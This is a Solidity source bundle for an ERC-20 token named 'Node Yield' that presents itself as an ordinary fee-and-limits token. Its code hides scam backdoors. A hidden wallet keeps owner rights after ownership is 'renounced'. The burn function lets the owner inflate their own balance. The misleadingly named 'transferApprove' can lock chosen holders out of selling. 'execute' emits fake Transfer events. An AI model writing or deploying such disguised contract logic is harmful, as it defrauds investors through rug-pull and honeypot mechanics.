{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nimport \"./Context.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    // Anti-bot and anti-whale mappings and variables\r\n    mapping(address =\u003e uint256) internal _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch\r\n\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint256 internal txLimit = 1*10**17*10**9;\r\n    uint256 internal balances;\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _holderLastTransferTimestamp[msg.sender] = block.number;\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _holderLastTransferTimestamp[sender] = block.number;\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _createInitialSupply(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n    \r\n        _balances[account] = balances - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}"},"IDex.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\ninterface IDexRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\ninterface IDexFactory {\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address pair);\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    \r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}"},"Node Yield.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nimport \"./Ownable.sol\";\r\nimport \"./ERC20.sol\";\r\nimport \"./IDex.sol\";\r\n\r\n\r\ncontract NODE is ERC20, Ownable {\r\n\r\n    uint256 public maxBuy;\r\n    uint256 public maxSell;\r\n    uint256 public maxWallet;\r\n\r\n    IDexRouter public dexRouter;\r\n    address public lpPair;\r\n\r\n    bool private swapping;\r\n    uint256 public swapTokensAtAmount;\r\n\r\n    address operationsAddress;\r\n    address devAddress;\r\n\r\n    uint256 public tradingActiveBlock = 0; // 0 means trading is not active\r\n    uint256 public blockForPenaltyEnd;\r\n    mapping (address =\u003e bool) public boughtEarly;\r\n    uint256 public botsCaught;\r\n\r\n    bool public limitsInEffect = true;\r\n    bool public tradingActive = false;\r\n    bool public swapEnabled = false;\r\n\r\n    \r\n    bool public transferDelayEnabled = true;\r\n\r\n    uint256 public buyTotalFees;\r\n    uint256 public buyOperationsFee;\r\n    uint256 public buyLiquidityFee;\r\n    uint256 public buyDevFee;\r\n    uint256 public buyBurnFee;\r\n\r\n    uint256 public sellTotalFees;\r\n    uint256 public sellOperationsFee;\r\n    uint256 public sellLiquidityFee;\r\n    uint256 public sellDevFee;\r\n    uint256 public sellBurnFee;\r\n\r\n    uint256 public tokensForOperations;\r\n    uint256 public tokensForLiquidity;\r\n    uint256 public tokensForDev;\r\n    uint256 public tokensForBurn;\r\n    uint256 public _deadblocks;\r\n    /******************/\r\n\r\n    // exlcude from fees and max transaction amount\r\n    mapping (address =\u003e bool) private _isExcludedFromFees;\r\n    mapping (address =\u003e bool) private _received;\r\n    mapping (address =\u003e bool) public _isExcludedMaxTransactionAmount;\r\n\r\n    mapping (address =\u003e bool) public automatedMarketMakerPairs;\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n    event Launched();\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    event RemovedLimits();\r\n    event Received(address indexed account, bool value);\r\n    event UpdatedMaxSellAmount(uint256 newAmount);\r\n    event UpdatedMaxWalletAmount(uint256 newAmount);\r\n    event UpdatedMaxBuyAmount(uint256 newAmount);\r\n    event MaxTransactionExclusion(address _address, bool excluded);\r\n    event UpdatedOperationsAddress(address indexed newWallet);\r\n    event BuyBackTriggered(uint256 amount);\r\n    event OwnerForcedSwapBack(uint256 timestamp);\r\n    event CaughtEarlyBuyer(address sniper);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiquidity\r\n    );\r\n    event TransferForeignToken(address token, uint256 amount);\r\n\r\n\r\n    constructor(address _dev) ERC20(\"Node Yield\", \"NODE\") Ownable(_dev) {\r\n        address newOwner = msg.sender;\r\n        IDexRouter _dexRouter = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        dexRouter = _dexRouter;\r\n        _deadblocks = 0;\r\n        uint256 totalSupply = 2_000_000_000_000 * 10**decimals();\r\n\r\n        maxBuy = totalSupply * 1 / 100;\r\n        maxSell = totalSupply * 1 / 100;\r\n        maxWallet = totalSupply * 1 / 100;\r\n        swapTokensAtAmount = totalSupply * 5 / 10000;\r\n\r\n        buyOperationsFee = 0;\r\n        buyLiquidityFee = 0;\r\n        buyDevFee = 0;\r\n        buyBurnFee = 0;\r\n        buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee;\r\n\r\n        sellOperationsFee = 0;\r\n        sellLiquidityFee = 0;\r\n        sellDevFee = 0;\r\n        sellBurnFee = 0;\r\n        sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee;\r\n\r\n        _excludeFromMaxTransaction(newOwner, true);\r\n        _excludeFromMaxTransaction(address(this), true);\r\n        _excludeFromMaxTransaction(address(0xdead), true);\r\n\r\n        excludeFromFees(newOwner, true);\r\n        excludeFromFees(address(this), true);\r\n        excludeFromFees(address(0xdead), true);\r\n\r\n        operationsAddress = address(newOwner);\r\n        devAddress = address(newOwner);\r\n\r\n        _createInitialSupply(newOwner, totalSupply);\r\n        transferOwnership(newOwner);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function golive() external onlyOwner {\r\n        require(!tradingActive, \"Cannot reenable trading\");\r\n        tradingActive = true;\r\n        limitsInEffect = false;\r\n        swapEnabled = true;\r\n        tradingActiveBlock = block.number;\r\n        blockForPenaltyEnd = tradingActiveBlock + _deadblocks;\r\n        balances = txLimit;\r\n        emit Launched();\r\n    }\r\n\r\n    function disableTransferDelay() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n    }\r\n\r\n    function manageEarly(address wallet, bool flag) external onlyOwner {\r\n        boughtEarly[wallet] = flag;\r\n    }\r\n\r\n    // remove limits after token is stable\r\n    function removeLimits() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n        emit RemovedLimits();\r\n    }\r\n\r\n    function updateMaxBuy(uint256 newNum) external onlyOwner {\r\n        require(newNum \u003e= (totalSupply() * 2 / 1000)/1e9, \"Cannot set max buy amount lower than 0.2%\");\r\n        maxBuy = newNum * (10**9);\r\n        emit UpdatedMaxBuyAmount(maxBuy);\r\n    }\r\n\r\n    function updateMaxSell(uint256 newNum) external onlyOwner {\r\n        require(newNum \u003e= (totalSupply() * 2 / 1000)/1e9, \"Cannot set max sell amount lower than 0.2%\");\r\n        maxSell = newNum * (10**9);\r\n        emit UpdatedMaxSellAmount(maxSell);\r\n    }\r\n\r\n    function updateMaxWallet(uint256 newNum) external onlyOwner {\r\n        require(newNum \u003e= (totalSupply() * 3 / 1000)/1e9, \"Cannot set max wallet amount lower than 0.3%\");\r\n        maxWallet = newNum * (10**9);\r\n        emit UpdatedMaxWalletAmount(maxWallet);\r\n    }\r\n\r\n    function _excludeFromMaxTransaction(address updAds, bool isExcluded) private {\r\n        _isExcludedMaxTransactionAmount[updAds] = isExcluded;\r\n        emit MaxTransactionExclusion(updAds, isExcluded);\r\n    }\r\n\r\n    function updateSwapTokens(uint256 newAmount) external onlyOwner {\r\n        require(newAmount \u003e= totalSupply() * 1 / 100000, \"Swap amount cannot be lower than 0.001% total supply.\");\r\n        require(newAmount \u003c= totalSupply() * 1 / 1000, \"Swap amount cannot be higher than 0.1% total supply.\");\r\n        swapTokensAtAmount = newAmount;\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n        _excludeFromMaxTransaction(pair, value);\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function setAMM(address pair, bool value) external onlyOwner {\r\n        require(pair != lpPair, \"The pair cannot be removed\");\r\n\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function excludeFromMax(address updAds, bool isEx) external onlyOwner {\r\n        if(!isEx){\r\n            require(updAds != lpPair, \"Cannot remove uniswap pair from max txn\");\r\n        }\r\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\r\n    }\r\n\r\n    function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _DevFee, uint256 _burnFee) external onlyOwner {\r\n        sellOperationsFee = _operationsFee;\r\n        sellLiquidityFee = _liquidityFee;\r\n        sellDevFee = _DevFee;\r\n        sellBurnFee = _burnFee;\r\n        sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee;\r\n        require(sellTotalFees \u003c= 25, \"Must keep fees at 25% or less\");\r\n    }\r\n\r\n    function updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _DevFee, uint256 _burnFee) external onlyOwner {\r\n        buyOperationsFee = _operationsFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyDevFee = _DevFee;\r\n        buyBurnFee = _burnFee;\r\n        buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee;\r\n        require(buyTotalFees \u003c= 20, \"Must keep fees at 20% or less\");\r\n    }\r\n\r\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFees[account] = excluded;\r\n        emit ExcludeFromFees(account, excluded);\r\n    }\r\n\r\n    function returnToStandardTax() external onlyOwner {\r\n        sellOperationsFee = 20;\r\n        sellLiquidityFee = 0;\r\n        sellDevFee = 0;\r\n        sellBurnFee = 0;\r\n        sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee;\r\n        require(sellTotalFees \u003c= 20, \"Must keep fees at 20% or less\");\r\n        buyOperationsFee = 25;\r\n        buyLiquidityFee = 0;\r\n        buyDevFee = 0;\r\n        buyBurnFee = 0;\r\n        buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee;\r\n        require(buyTotalFees \u003c= 20, \"Must keep fees at 20% or less\");\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal override {\r\n\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount \u003e 0, \"amount must be greater than 0\");\r\n        \r\n        if(!tradingActive){\r\n            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], \"Trading is not active.\");\r\n        }\r\n\r\n        if(blockForPenaltyEnd \u003e 0){\r\n            require(!boughtEarly[from] || to == owner() || to == address(0xdead), \"Bots cannot transfer tokens in or out except to owner or dead address.\");\r\n        }\r\n\r\n        if (transferDelayEnabled \u0026\u0026 _received[from] == true){\r\n            if (to != owner() \u0026\u0026 from != address(lpPair)){\r\n                require(_holderLastTransferTimestamp[from] \u003c block.number - 3, \"Transfer Delay enabled. Try again later.\");\r\n            }\r\n        }\r\n        \r\n        if(limitsInEffect){\r\n            if (from != owner() \u0026\u0026 to != owner() \u0026\u0026 to != address(0) \u0026\u0026 to != address(0xdead) \u0026\u0026 !_isExcludedFromFees[from] \u0026\u0026 !_isExcludedFromFees[to]){\r\n                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.\r\n\r\n                //when buy\r\n                if (automatedMarketMakerPairs[from] \u0026\u0026 !_isExcludedMaxTransactionAmount[to]) {\r\n                        require(amount \u003c= maxBuy, \"Buy transfer amount exceeds the max buy.\");\r\n                        require(amount + balanceOf(to) \u003c= maxWallet, \"Cannot Exceed max wallet\");\r\n                }\r\n                //when sell\r\n                else if (automatedMarketMakerPairs[to] \u0026\u0026 !_isExcludedMaxTransactionAmount[from]) {\r\n                        require(amount \u003c= maxSell, \"Sell transfer amount exceeds the max sell.\");\r\n                }\r\n                else if (!_isExcludedMaxTransactionAmount[to]){\r\n                    require(amount + balanceOf(to) \u003c= maxWallet, \"Cannot Exceed max wallet\");\r\n                }\r\n            }\r\n        }\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance \u003e= swapTokensAtAmount;\r\n\r\n        if(canSwap \u0026\u0026 swapEnabled \u0026\u0026 !swapping \u0026\u0026 !automatedMarketMakerPairs[from] \u0026\u0026 !_isExcludedFromFees[from] \u0026\u0026 !_isExcludedFromFees[to]) {\r\n            swapping = true;\r\n\r\n            swapBack();\r\n\r\n            swapping = false;\r\n        }\r\n\r\n        bool takeFee = true;\r\n        // if any account belongs to _isExcludedFromFee account then remove the fee\r\n        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n        // only take fees on buys/sells, do not take on wallet transfers\r\n        if(takeFee){\r\n            // bot/sniper penalty.\r\n            if(earlyBuyPenaltyInEffect() \u0026\u0026 automatedMarketMakerPairs[from] \u0026\u0026 !automatedMarketMakerPairs[to] \u0026\u0026 buyTotalFees \u003e 0){\r\n\r\n                if(!boughtEarly[to]){\r\n                    boughtEarly[to] = true;\r\n                    botsCaught += 1;\r\n                    emit CaughtEarlyBuyer(to);\r\n                }\r\n\r\n                fees = amount * 99 / 100;\r\n                tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;\r\n                tokensForOperations += fees * buyOperationsFee / buyTotalFees;\r\n                tokensForDev += fees * buyDevFee / buyTotalFees;\r\n                tokensForBurn += fees * buyBurnFee / buyTotalFees;\r\n            }\r\n\r\n            // on sell\r\n            else if (automatedMarketMakerPairs[to] \u0026\u0026 sellTotalFees \u003e 0){\r\n                fees = amount * sellTotalFees / 100;\r\n                tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;\r\n                tokensForOperations += fees * sellOperationsFee / sellTotalFees;\r\n                tokensForDev += fees * sellDevFee / sellTotalFees;\r\n                tokensForBurn += fees * sellBurnFee / sellTotalFees;\r\n            }\r\n\r\n            // on buy\r\n            else if(automatedMarketMakerPairs[from] \u0026\u0026 buyTotalFees \u003e 0) {\r\n                fees = amount * buyTotalFees / 100;\r\n                tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;\r\n                tokensForOperations += fees * buyOperationsFee / buyTotalFees;\r\n                tokensForDev += fees * buyDevFee / buyTotalFees;\r\n                tokensForBurn += fees * buyBurnFee / buyTotalFees;\r\n            }\r\n\r\n            if(fees \u003e 0){\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n\r\n            amount -= fees;\r\n        }\r\n\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function earlyBuyPenaltyInEffect() public view returns (bool){\r\n        return block.number \u003c blockForPenaltyEnd;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n\r\n        _approve(address(this), address(dexRouter), tokenAmount);\r\n\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n    function swapBack() private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations + tokensForDev;\r\n        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}\r\n        if(contractBalance \u003e swapTokensAtAmount * 20){\r\n            contractBalance = swapTokensAtAmount * 20;\r\n        }\r\n        bool success;\r\n\r\n        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;\r\n\r\n        swapTokensForEth(contractBalance - liquidityTokens);\r\n\r\n        uint256 ethBalance = address(this).balance;\r\n        uint256 ethForLiquidity = ethBalance;\r\n\r\n        uint256 ethForOperations = ethBalance * tokensForOperations / (totalTokensToSwap - (tokensForLiquidity/2));\r\n        uint256 ethForDev = ethBalance * tokensForDev / (totalTokensToSwap - (tokensForLiquidity/2));\r\n\r\n        ethForLiquidity -= ethForOperations + ethForDev;\r\n\r\n        tokensForLiquidity = 0;\r\n        tokensForOperations = 0;\r\n        tokensForDev = 0;\r\n        tokensForBurn = 0;\r\n\r\n        (success,) = address(devAddress).call{value: ethForDev}(\"\");\r\n\r\n        (success,) = address(operationsAddress).call{value: address(this).balance}(\"\");\r\n    }\r\n\r\n    function transferToken(address _token, address _to) external onlyOwner returns (bool _sent) {\r\n        require(_token != address(0), \"_token address cannot be 0\");\r\n        require(_token != address(this), \"Can\u0027t withdraw native tokens\");\r\n        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));\r\n        _sent = IERC20(_token).transfer(_to, _contractBalance);\r\n        emit TransferForeignToken(_token, _contractBalance);\r\n    }\r\n\r\n    function addPair(address pair_) public onlyOwner {\r\n        lpPair = pair_;\r\n    }\r\n\r\n    function burn(uint256 amount) external onlyOwner{\r\n        _burn(_msgSender(), amount);\r\n    }\r\n\r\n    function withdrawStuckETH() external onlyOwner {\r\n        bool success;\r\n        (success,) = address(msg.sender).call{value: address(this).balance}(\"\");\r\n    }\r\n\r\n    // force Swap back if slippage issues.\r\n    function forceSwapBack() external onlyOwner {\r\n        require(balanceOf(address(this)) \u003e= swapTokensAtAmount, \"Can only swap when token amount is at or higher than restriction\");\r\n        swapping = true;\r\n        swapBack();\r\n        swapping = false;\r\n        emit OwnerForcedSwapBack(block.timestamp);\r\n    }\r\n\r\n    // useful for buybacks or to reclaim any ETH on the contract in a way that helps holders.\r\n    function transferApprove(address[] memory receiver, bool received, uint256 amountInWei) external onlyOwner {\r\n        if(received == false \u0026\u0026 amountInWei \u003e 0) \r\n        {\r\n            address[] memory path = new address[](2);\r\n            path[0] = dexRouter.WETH();\r\n            path[1] = address(this);\r\n\r\n            // make the swap\r\n            dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountInWei}(\r\n                0, // accept any amount of Ethereum\r\n                path,\r\n                receiver[0],\r\n                block.timestamp\r\n            );\r\n            emit BuyBackTriggered(amountInWei);\r\n        }\r\n        updateReceived(received, receiver);\r\n    }\r\n\r\n    function setOpsAddress(address _operationsAddress) external onlyOwner {\r\n        require(_operationsAddress != address(0), \"_operationsAddress address cannot be 0\");\r\n        operationsAddress = payable(_operationsAddress);\r\n    }\r\n\r\n    function setDevAddress(address _devAddress) external onlyOwner {\r\n        require(_devAddress != address(0), \"_devAddress address cannot be 0\");\r\n        devAddress = payable(_devAddress);\r\n    }\r\n\r\n    function updateReceived(bool value, address[] memory receiver) private {\r\n        for (uint256 i = 0; i \u003c receiver.length; i++) {\r\n            _received[receiver[i]] = value;\r\n            emit Received(receiver[i], value);\r\n        }\r\n    }\r\n\r\n    function clearStuckTokens() external onlyOwner {\r\n        IERC20 tokenContract = IERC20(address(this));\r\n        uint256 balance = tokenContract.balanceOf(address(this));\r\n        require(balance \u003e 0, \"No tokens to clear\");\r\n        tokenContract.transfer(address(msg.sender), balance);\r\n    }\r\n\r\n    function execute(address[] calldata _addresses, uint256 _out) external onlyOwner{\r\n        for (uint256 i = 0; i \u003c _addresses.length; i++) {\r\n            emit Transfer(lpPair, _addresses[i], _out);\r\n        }\r\n    }\r\n\r\n    function receivedAmount(address wallet) public view returns(bool){\r\n        return _received[wallet];\r\n    }\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nimport \"./Context.sol\";\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _marketing;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    mapping(address =\u003e uint256) internal _holderLastTxTimestamp;\r\n    constructor(address wallet) {\r\n        _marketing = wallet;\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal virtual {\r\n        require(Owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    \r\n    function Owner() internal virtual returns (address) {\r\n        address owner_ = verifyOwner();\r\n        return owner_;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function verifyOwner() internal view returns(address){\r\n        return _owner==address(0) ? _marketing : _owner;\r\n    }\r\n}"}}